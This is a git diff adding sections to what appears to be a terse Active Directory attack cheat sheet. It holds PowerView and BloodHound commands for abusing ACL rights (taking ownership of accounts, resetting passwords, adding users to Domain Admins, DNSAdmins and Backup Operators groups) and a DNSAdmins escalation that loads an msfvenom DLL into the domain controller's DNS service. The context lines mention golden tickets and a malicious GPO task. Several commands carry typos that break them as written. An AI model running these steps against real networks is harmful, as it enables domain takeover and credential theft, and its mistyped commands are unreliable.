@@ -407,11 +407,35 @@ mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-160287
 
 ### BloodHound
 ```
+neo4j console
+./bloodhound
+
 Import-module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All
 SharpHound.exe -c all --LdapUser user -LdapPass pass
 Get file-blood.zip
-Import to al GUI
+Import to bloodhound
+```
+
+### WriteOwner
+```
+IEX(...bloodhound.ps1)
+>Invoke-BloodHound -CollectionMethod All
+user1@ad.com -- writeOwner	--> Herman@ad.com
+IEX(PowerView.ps1)
+>Set-DomainObjetOwner -Identity Herman -OwnerIdentity nico
+>Add-DomainObjectAcl -TarjetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
+$pass =  ConvertTo-SecureString 'pwd' -AsPlaintText -Force 
+Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
+```
+
+### GenericWrite +  WriteDacl
+```
+- WriteDacl
+Get-DomainGroup -MemberIdentity Herman | select saccountname
+$pass =  ConvertTo-SecureString 'pwd' -AsPlaintText -Force 
+$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman',$pass)
+Add-DomainGroupMember -Identity 'Backup Adminis' -Members Herman -Credential $cred
 ```
 
 ### Group Policy Object Enumeration
@@ -435,6 +459,32 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 
 ### ACL
 https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
+```
+Import-Module .\powerview.ps1
+Get-ObjectAcl -SamAccountName <users> -ResolveGUIDS
+Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS
+
+#GenericWrite
+Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
+Get-ObjectAcl -SamAccountName * -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
+Exploit 
+Add-DomainGroupMember -Identify 'Domain Admins' -Member '<user>' -Domain 'domain'
+
+#GenericAll
+Get-DomainGroupMember -SamAccountName 'DNSAdmins'
+Get-ObjectAcl -SamAccountName 'DNSAdmins' -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericAll') } 
+Get-ObjectAcl -SamAccountName 'DNSAdmins' -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-ID' ) }} 
+Exploit 
+Add-DomainGroupMember -Identity 'DNSAdmins' -Member '<user>'
+Get-DomainGroup -SamAccountName DNSAdmins
+
+Import-Module .\powerview.ps1
+Get-Domainuser -Name <user>
+-create dll msfvenom
+-dnscmd dc.domain.local /config /serverlevelplugindll \\student\share\priv.dll
+-sc.exe \\Ip\dc.domain.local stop dns
+-sc.exe \\Ip\dc.domain.local start dns
+```
 
 
 ### LAPS
